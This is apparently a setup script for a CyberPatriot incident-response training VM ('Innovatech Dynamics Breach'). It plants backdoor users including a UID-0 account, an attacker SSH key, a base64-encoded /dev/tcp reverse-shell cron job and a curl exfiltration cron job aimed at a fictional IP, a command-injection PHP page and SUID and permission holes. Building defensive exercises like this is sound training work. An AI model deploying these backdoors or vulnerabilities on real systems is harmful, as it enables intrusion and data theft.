#!/bin/bash
# CyberPatriot Linux Incident Response Scenario - "Innovatech Dynamics Breach"
# Creates a Linux VM simulating a post-attack scenario for intermediate cadets.
# Focuses on common, fixable issues found in competitions.
# Version: 1.1-unique

# Exit on any error
set -e

# --- Customizable Variables ---
INNOVATECH_HOSTNAME="corp-linux-web01" # More specific hostname
PRIMARY_ADMIN_USER="sysadmin_innovatech" # Unique admin username
PRIMARY_ADMIN_PASS="InnovatechPass2024#" # Unique password
AUTHORIZED_REGULAR_USERS=("admin_ops" "webdev_team" "backup_svc" "dev_intern") # Unique user names
ROOT_ADMIN_PASSWORD="R00tP@ssW0rdInnovatech!" # Unique root password
SIMULATED_ATTACKER_IP="10.180.30.15" # Different fictional attacker IP
SCENARIO_DIFFICULTY="intermediate" # Kept for reference, tailored for intermediate
SETUP_LOGFILE="/var/log/innovatech-vm-setup.log" # Unique log file name
BACKDOOR_SVC_USER="svc_monitor_app" # More specific backdoor username
HIDDEN_DATA_DIR="/opt/.innovatech-internal-data" # Unique hidden directory
COMPETITION_FLAG="CP-INNOVATECH-WEBSRV-SEC-2024-GAMMA" # Unique flag text
WEAK_PW_USER="temp_dev_acct" # Unique weak password username
WEAK_PW_VALUE="password@1" # Slightly different weak password

# --- Script Execution ---
exec > >(tee -a "$SETUP_LOGFILE") 2>&1
echo "Setting up CyberPatriot 'Innovatech Dynamics Breach' VM (v1.1-unique)..."
echo "Scenario Difficulty: $SCENARIO_DIFFICULTY"
echo "Simulated Attacker IP used in logs: $SIMULATED_ATTACKER_IP"

# Function for logging steps
log_setup_step() {
    echo "[$(date +'%Y-%m-%d %H:%M:%S')] [SETUP] $1"
}

# 1. Initial System Setup
# --------------------
log_setup_step "Configuring initial system settings (hostname)..."
hostnamectl set-hostname $INNOVATECH_HOSTNAME

# Create legitimate primary user
log_setup_step "Creating primary admin user: $PRIMARY_ADMIN_USER"
useradd -m -s /bin/bash $PRIMARY_ADMIN_USER || log_setup_step "User $PRIMARY_ADMIN_USER likely exists"
echo "$PRIMARY_ADMIN_USER:$PRIMARY_ADMIN_PASS" | chpasswd
usermod -aG sudo $PRIMARY_ADMIN_USER # Add primary user to sudo group

# Create other authorized users
log_setup_step "Creating authorized regular users: ${AUTHORIZED_REGULAR_USERS[*]}"
for user in "${AUTHORIZED_REGULAR_USERS[@]}"; do
    if ! id "$user" &>/dev/null; then
        useradd -m -s /bin/bash "$user"
        echo "$user:AuthUserP@ssInnovatech!" | chpasswd # Unique default pass
        log_setup_step "Created user $user"
    else
        log_setup_step "User $user likely exists"
    fi
done
# Specific group for dev_intern
groupadd interns 2>/dev/null || log_setup_step "Group 'interns' likely exists"
usermod -aG interns dev_intern

# Set root password
log_setup_step "Setting root password"
echo "root:$ROOT_ADMIN_PASSWORD" | chpasswd

# 2. Simulate Attack Evidence
# ---------------------------
log_setup_step "Simulating attack evidence (SSH logs)..."
mkdir -p /var/log/attack-simulation
CURRENT_DATE=$(date +"%b %e")
HOUR=$(date +"%H")
# Simulate attack time a few hours prior
RANDOM_HOUR=$(( ( HOUR - (RANDOM % 4 + 2) + 24 ) % 24 ))
ATTACK_TIME=$(printf "%02d" $RANDOM_HOUR)

# Create simulated auth.log entries
cat > /var/log/attack-simulation/auth.log << EOF
$CURRENT_DATE $ATTACK_TIME:14:22 $INNOVATECH_HOSTNAME sshd[$(($RANDOM%1000+1000))]: Failed password for invalid user test from $SIMULATED_ATTACKER_IP port 43150 ssh2
$CURRENT_DATE $ATTACK_TIME:14:28 $INNOVATECH_HOSTNAME sshd[$(($RANDOM%1000+1000))]: Failed password for root from $SIMULATED_ATTACKER_IP port 43156 ssh2
$CURRENT_DATE $ATTACK_TIME:14:32 $INNOVATECH_HOSTNAME sshd[$(($RANDOM%1000+1000))]: Failed password for $PRIMARY_ADMIN_USER from $SIMULATED_ATTACKER_IP port 43160 ssh2
$CURRENT_DATE $ATTACK_TIME:14:36 $INNOVATECH_HOSTNAME sshd[$(($RANDOM%1000+1000))]: Accepted password for $PRIMARY_ADMIN_USER from $SIMULATED_ATTACKER_IP port 43164 ssh2
$CURRENT_DATE $ATTACK_TIME:14:36 $INNOVATECH_HOSTNAME sshd[$(($RANDOM%1001+1000))]: pam_unix(sshd:session): session opened for user $PRIMARY_ADMIN_USER by (uid=0)
$CURRENT_DATE $ATTACK_TIME:15:42 $INNOVATECH_HOSTNAME sudo: $PRIMARY_ADMIN_USER : TTY=pts/0 ; PWD=/home/$PRIMARY_ADMIN_USER ; USER=root ; COMMAND=/usr/bin/apt update
$CURRENT_DATE $ATTACK_TIME:15:42 $INNOVATECH_HOSTNAME sudo: pam_unix(sudo:session): session opened for user root by $PRIMARY_ADMIN_USER(uid=0)
EOF
# Inject simulated logs (append to avoid overwriting existing logs)
cat /var/log/attack-simulation/auth.log >> /var/log/auth.log || log_setup_step "Warning: Could not append to /var/log/auth.log"

# 3. Create Backdoor User Accounts
# -------------------------------
log_setup_step "Creating backdoor user accounts..."
# Backdoor user with sudo - standard CP item, easy to find via sudo group check
useradd -m -s /bin/bash "$BACKDOOR_SVC_USER" || log_setup_step "User $BACKDOOR_SVC_USER likely exists"
echo "$BACKDOOR_SVC_USER:SvcMonPassInnovatech!77" | chpasswd # Unique password
usermod -aG sudo "$BACKDOOR_SVC_USER"

# Hidden root-equivalent user (UID 0) - standard CP item, find via UID check
useradd -o -u 0 -g 0 -m -s /bin/bash "sys_updater_svc" || log_setup_step "User sys_updater_svc likely exists" # Unique name
echo "sys_updater_svc:Upd@teSvcP@ss!" | chpasswd # Unique password

# Add a user with weak password - standard CP item, find via password audit/guessing
useradd -m -s /bin/bash "$WEAK_PW_USER" || log_setup_step "User $WEAK_PW_USER likely exists"
echo "$WEAK_PW_USER:$WEAK_PW_VALUE" | chpasswd
log_setup_step "Created user $WEAK_PW_USER with weak password '$WEAK_PW_VALUE'"

# 4. Setup SSH Backdoors
# ---------------------
log_setup_step "Configuring SSH vulnerabilities..."
apt update > /dev/null
apt install -y openssh-server > /dev/null

# Allow root login and password auth (vulnerability) - common CP fixes
sed -i 's/^#*PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
sed -i 's/^#*PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config
# Add a less common but insecure option for intermediate level
echo "IgnoreRhosts yes" >> /etc/ssh/sshd_config # Often overlooked
systemctl restart sshd || log_setup_step "Warning: sshd restart failed"

# Create SSH keys for backdoor access in a hidden location - find via find command or checking user .ssh dirs
mkdir -p "$HIDDEN_DATA_DIR"
chmod 700 "$HIDDEN_DATA_DIR" # Restrict access to hidden dir
ssh-keygen -t rsa -b 4096 -f "$HIDDEN_DATA_DIR/id_attacker_rsa" -N "" > /dev/null # Use RSA for variety
mkdir -p /root/.ssh
chmod 700 /root/.ssh
cat "$HIDDEN_DATA_DIR/id_attacker_rsa.pub" >> /root/.ssh/authorized_keys # Add key for root
chmod 600 /root/.ssh/authorized_keys
# Also add to primary user's account
mkdir -p /home/$PRIMARY_ADMIN_USER/.ssh
cat "$HIDDEN_DATA_DIR/id_attacker_rsa.pub" >> /home/$PRIMARY_ADMIN_USER/.ssh/authorized_keys # Add key for primary user
chmod 700 /home/$PRIMARY_ADMIN_USER/.ssh
chmod 600 /home/$PRIMARY_ADMIN_USER/.ssh/authorized_keys
chown -R $PRIMARY_ADMIN_USER:$PRIMARY_ADMIN_USER /home/$PRIMARY_ADMIN_USER/.ssh
log_setup_step "SSH backdoor key stored in $HIDDEN_DATA_DIR/id_attacker_rsa and added to root and $PRIMARY_ADMIN_USER"

# 5. Create Malicious Cron Jobs
# ----------------------------
log_setup_step "Setting up persistence via cron..."
# Slightly obfuscated reverse shell - Base64 is common enough for intermediate, find via checking cron files
REVERSE_SHELL_CMD="bash -c 'sh -i >& /dev/tcp/$SIMULATED_ATTACKER_IP/4444 0>&1'"
OBFUSCATED_CMD=$(echo "$REVERSE_SHELL_CMD" | base64)
# Use a more standard cron location/name but slightly different
echo "*/19 * * * * root echo $OBFUSCATED_CMD | base64 -d | bash # System Health Check" > /etc/cron.d/sys-health-check # Unique name/comment

# Data exfiltration cron job (modified path) - Simpler command, find via checking cron files
cat > /etc/cron.d/log-archive << EOF
# Daily log archiving task (compromised)
33 5 * * * root cp /var/log/syslog $HIDDEN_DATA_DIR/syslog.bak && curl -F "log=@$HIDDEN_DATA_DIR/syslog.bak" http://$SIMULATED_ATTACKER_IP:8080/logupload.php # Unique script name
EOF
chmod 644 /etc/cron.d/sys-health-check
chmod 644 /etc/cron.d/log-archive

# 6. Install Vulnerable Services
# ----------------------------
log_setup_step "Setting up vulnerable services (Telnet, FTP, Apache)..."
# Install Telnet (insecure)
apt install -y telnetd > /dev/null || log_setup_step "Failed to install telnetd"
systemctl enable telnet.socket || log_setup_step "Failed to enable telnetd"

# Install vsftpd with anonymous upload enabled
apt install -y vsftpd > /dev/null || log_setup_step "Failed to install vsftpd"
sed -i 's/anonymous_enable=NO/anonymous_enable=YES/' /etc/vsftpd.conf 2>/dev/null
sed -i 's/#anon_upload_enable=YES/anon_upload_enable=YES/' /etc/vsftpd.conf 2>/dev/null
sed -i 's/#anon_mkdir_write_enable=YES/anon_mkdir_write_enable=YES/' /etc/vsftpd.conf 2>/dev/null
echo "write_enable=YES" >> /etc/vsftpd.conf
systemctl enable vsftpd || log_setup_step "Failed to enable vsftpd"
systemctl restart vsftpd || log_setup_step "Failed to restart vsftpd"

# Install Apache with a simple vulnerable PHP page (if not basic level)
if [ "$SCENARIO_DIFFICULTY" != "basic" ]; then
  apt install -y apache2 php libapache2-mod-php > /dev/null || log_setup_step "Failed to install web server"
  # Simple page vulnerable to command injection via parameter - Clearer vulnerability, find via web access or code review
  cat > /var/www/html/networkutils.php << EOF
<?php
  echo "<h1>Network Diagnostic Tool</h1>"; // Unique title
  if (isset(\$_GET['host_ip'])) { // Unique parameter name
    \$target = \$_GET['host_ip'];
    // Simple, direct command injection vulnerability
    echo "<pre>Running diagnostics on \$target...</pre>";
    echo "<pre>";
    system("ping -c 2 " . \$target); // The vulnerable part - reduced ping count
    echo "</pre>";
  } else {
    echo "<p>Provide a 'host_ip' parameter to run diagnostics (e.g., ?host_ip=127.0.0.1).</p>";
  }
?>
EOF
  chmod 644 /var/www/html/networkutils.php
  # Add world-writable directory within web root - Common CP item
  mkdir -p /var/www/html/uploads
  chmod 777 /var/www/html/uploads
  # Add insecure .htaccess file allowing script execution in uploads
  cat > /var/www/html/uploads/.htaccess << EOF
AddHandler cgi-script .php .pl .py .sh
Options +ExecCGI
EOF
  chmod 644 /var/www/html/uploads/.htaccess
  # Ensure mod_cgi is enabled if needed, though AddHandler might suffice
  a2enmod cgi 2>/dev/null || log_setup_step "Warning: Could not enable mod_cgi"
  systemctl enable apache2 || log_setup_step "Failed to enable apache2"
  systemctl restart apache2 || log_setup_step "Failed to restart apache2" # Restart to apply .htaccess
fi

# 7. Create SUID Binary Backdoor (if intermediate/advanced)
# ----------------------------
# Simplified SUID approach: Copy common utility and set SUID - find via find command for SUID files
if [ "$SCENARIO_DIFFICULTY" != "basic" ]; then
  log_setup_step "Creating SUID binary backdoor (simple version)..."
  cp /usr/bin/less /usr/local/bin/readlogs # Copy 'less' utility
  chmod u+s /usr/local/bin/readlogs # Set SUID bit - 'less' can often escape to shell
  log_setup_step "SUID backdoor created at /usr/local/bin/readlogs (copied from /usr/bin/less)"
fi

# 8. Add Backdoor Systemd Service
# -----------------------------
log_setup_step "Creating backdoor systemd service..."
# Service that periodically runs a simple script placed by attacker - find via systemctl list-units or checking service files
# Create the script the service will run
mkdir -p /usr/local/share/.sysdata # Unique hidden directory for script
cat > /usr/local/share/.sysdata/sync.sh << EOF
#!/bin/bash
# Malicious script run by systemd service
# Example: Creates a marker file or sends data
echo "Sync service ran at \$(date)" >> $HIDDEN_DATA_DIR/sync_svc.log
# Add more malicious actions here if desired for advanced levels
# Example: touch /tmp/sync_marker_$(date +%s)
touch /tmp/sync_marker_file
EOF
chmod +x /usr/local/share/.sysdata/sync.sh

# Create the service file with a plausible name
cat > /etc/systemd/system/network-sync.service << EOF
[Unit]
Description=Network Time Synchronization Helper (Compromised) # Name suggests legitimacy but is compromised
After=network.target

[Service]
Type=simple
# Runs a hidden script periodically
ExecStart=/bin/bash /usr/local/share/.sysdata/sync.sh
Restart=on-failure
User=nobody # Run as less privileged user to be less obvious

[Install]
WantedBy=multi-user.target
EOF
systemctl enable network-sync.service || log_setup_step "Failed to enable network-sync service"
systemctl start network-sync.service || log_setup_step "Failed to start network-sync service" # Start it so it creates evidence

# 9. Disable Security Controls / Introduce Misconfigurations
# -------------------------------------------------------
log_setup_step "Disabling security controls and adding misconfigurations..."
# Disable firewall if installed
if command -v ufw &>/dev/null; then
  ufw disable
fi
# Incorrect permissions
chmod 666 /etc/hosts 2>/dev/null
chmod 777 /var/log 2>/dev/null # Overly permissive log directory
# Disable automatic updates
if [ -f /etc/apt/apt.conf.d/20auto-upgrades ]; then
  sed -i 's/1/0/' /etc/apt/apt.conf.d/20auto-upgrades
fi
# Weaken password policy slightly if libpam-pwquality is installed - common CP item, find via checking PAM config
if dpkg -s libpam-pwquality &> /dev/null; then
    # Check if config file exists before trying to modify
    if [ -f /etc/security/pwquality.conf ]; then
        sed -i 's/^minlen\s*=.*/minlen = 8/' /etc/security/pwquality.conf 2>/dev/null || log_setup_step "Warning: Failed to set minlen in pwquality.conf"
        # Add a line to disable complexity if not present
        grep -q "^enforce_for_root" /etc/security/pwquality.conf || echo "enforce_for_root = 0" >> /etc/security/pwquality.conf
    else
        log_setup_step "Warning: /etc/security/pwquality.conf not found, skipping pwquality changes."
    fi
fi
# Add insecure entry to /etc/hosts - Common CP item, find via checking /etc/hosts
echo "127.0.0.1 internal-dev-site.local" >> /etc/hosts # Unique name

# 10. Insert competition flag
# -----------------------
log_setup_step "Adding competition flag..."
mkdir -p "$HIDDEN_DATA_DIR/data"
echo "FLAG: $COMPETITION_FLAG" > "$HIDDEN_DATA_DIR/data/confidential.txt"
chmod 400 "$HIDDEN_DATA_DIR/data/confidential.txt" # Keep permissions tight
chown root:root "$HIDDEN_DATA_DIR/data/confidential.txt"
log_setup_step "Flag placed in $HIDDEN_DATA_DIR/data/confidential.txt"

# 11. Create README with scenario details
# ---------------------------------
log_setup_step "Creating competition README..."
README_FILE="/home/$PRIMARY_ADMIN_USER/Desktop/README-Innovatech-Incident.txt"
mkdir -p /home/$PRIMARY_ADMIN_USER/Desktop
# Modify forensic questions to match simplified vulnerabilities
cat > "$README_FILE" << EOF
====================================================
CONFIDENTIAL: Innovatech Dynamics Incident Response
====================================================

SCENARIO:
Innovatech Dynamics' primary web server ($INNOVATECH_HOSTNAME) is suspected compromised. Unusual outbound traffic and failed login attempts have been detected. As the assigned security team member, investigate and secure this Ubuntu 22.04 system.

AUTHORIZED USERS:
- $PRIMARY_ADMIN_USER (System Administrator)
- ${AUTHORIZED_REGULAR_USERS[*]} (Standard Users/Roles)
- root (Use sudo, direct root login is discouraged)

EXPECTED SERVICES:
- SSH (Port 22)
- Apache Web Server (Port 80) - Running Innovatech Network Diagnostic Tool
- FTP Server (vsftpd) - For internal file drops ONLY

OBJECTIVES:
1. Identify and remove ALL unauthorized user accounts (e.g., $BACKDOOR_SVC_USER, sys_updater_svc, $WEAK_PW_USER) and access methods (keys, backdoors).
2. Discover and eliminate ALL attacker persistence mechanisms (cron, services, SUID binaries).
3. Secure vulnerable services (SSH, FTP, Apache) according to standard security practices.
4. Implement security best practices (firewall, updates, password policy).
5. Document all findings and remediation steps thoroughly.

FORENSIC QUESTIONS (Answer in your report):
1. What IP address initiated the SSH brute force attempts according to the logs?
2. What is the filename of the malicious cron job located in /etc/cron.d that attempts a reverse shell? (Hint: Check comments)
3. Identify at least three distinct persistence mechanisms used by the attacker (e.g., cron job, systemd service, SUID binary, backdoor user).
4. What type of vulnerability exists in the `networkutils.php` web application? (e.g., SQL Injection, Command Injection, XSS)
5. Find the competition flag hidden on the system. Format: FLAG: XXXX

TIME LIMIT: 120 minutes

SCORING: Points awarded for finding/fixing vulnerabilities, removing persistence, securing services, answering questions, and following best practices. Deductions for breaking required services.

Good luck, Analyst! Secure Innovatech's server!
====================================================
EOF

# Ensure README is accessible
chmod 644 "$README_FILE"
chown $PRIMARY_ADMIN_USER:$PRIMARY_ADMIN_USER /home/$PRIMARY_ADMIN_USER/Desktop
chown $PRIMARY_ADMIN_USER:$PRIMARY_ADMIN_USER "$README_FILE"

# Final cleanup
rm -f /tmp/suid_helper.c # Ensure helper source is gone
apt clean # Clean apt cache

log_setup_step "Setup complete! VM is ready for the 'Innovatech Dynamics Breach' exercise."
echo "Login with username: $PRIMARY_ADMIN_USER and password: $PRIMARY_ADMIN_PASS"
echo "Log file available at: $SETUP_LOGFILE"
